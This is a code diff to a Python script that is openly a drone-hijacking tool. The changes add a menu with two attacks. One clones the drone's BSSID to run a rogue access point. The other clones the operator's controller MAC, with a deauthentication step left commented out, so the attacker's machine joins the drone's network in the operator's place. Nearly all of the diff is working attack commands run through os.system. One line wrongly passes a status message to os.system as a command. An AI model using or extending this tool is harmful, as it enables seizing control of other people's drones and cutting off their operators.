@@ -126,34 +126,47 @@ def main():
     cc.join()
     handshake_capture()
     client_mac = "DA:D6:D9:DD:00:F9"
-    print(client_mac)
-
-    #used to spoof client mac address
-    #os.system(f"ifconfig {iface1} down")
-    #os.system(f"ip link set dev {iface1} address {client_mac}")
-    #os.system(f"ifconfig {iface1} up")
     
-    print('RAM memory % used:', psutil.virtual_memory()[2])
-    print("Fake Access Point\nWhen Done Press CTRL+C")
-    time.sleep(2.0)
-    #disable_monitor(iface)
+    #print('RAM memory % used:', psutil.virtual_memory()[2])
+    
+    #shows drone and operator information
     print('Drone information:',essid_name, bssid_name, channel_no)
     print('Drone controller info:',client_mac)
 
-    #used to spoof drone access point
-    os.system(f"ifconfig {iface} down")
-    os.system(f"iwconfig {iface} channel {channel_no}")
-    os.system(f"macchanger --mac={bssid_name} {iface}")
-    os.system(f"ifconfig {iface} up")
-
     create_configs(iface, essid_name, channel_no)
-    input("deauth in seperate window")
-    #da = Process(target = deauth, args = (0, bssid_name, iface))
-    #da.start()
-    rogue_ap()
-    #print('RAM memory % used:', psutil.virtual_memory()[2])
-    print("congrats")
-    #da.terminate()
+    choice = input("1 = Rogue AP\n2 = Connect to drone\n")
+    if (choice == "1"):
+        print("Fake Access Point\nWhen Done Press CTRL+C")
+        time.sleep(2.0)
+        #used to spoof drone access point
+        os.system(f"ifconfig {iface} down")
+        os.system(f"iwconfig {iface} channel {channel_no}")
+        os.system(f"macchanger --mac={bssid_name} {iface}")
+        os.system(f"ifconfig {iface} up")
+        print("Rogue Access Point Initialisation")
+        rogue_ap()
+
+    if (choice == "2"):
+        print("Drone connection & Operator deauthentication")
+        disable_monitor(iface)
+        os.system('airmon-ng check kill')
+        #da = Process(target = deauth, args = (0, client_mac, bssid_name, iface))
+        #da.start()
+        
+        #spoofing the client mac address for drone connection
+        os.system(f'ifconfig wlan0 down')
+        os.system(f'macchanger --mac={client_mac} wlan0')
+        
+        os.system(f"iwconfig wlan0 essid {essid_name}")
+        #da.terminate()
+        os.system(f'ifconfig wlan0 up')
+        os.system('dhclient -v wlan0')
+        os.system('Connection to drone established')
+    
+if __name__ == "__main__":
+    main()
+
+#print('RAM memory % used:', psutil.virtual_memory()[2])
 
 #2nd method to connecting to drone
     #os.system('airmon-ng check kill')
@@ -174,7 +187,4 @@ def main():
     #os.system('ifconfig wlan0 up')
     #os.system('dhclient -v wlan0')
     #os.system('Connection to drone established')
-    #da.terminate()
-
-if __name__ == "__main__":
-    main()
+    #da.terminate()    
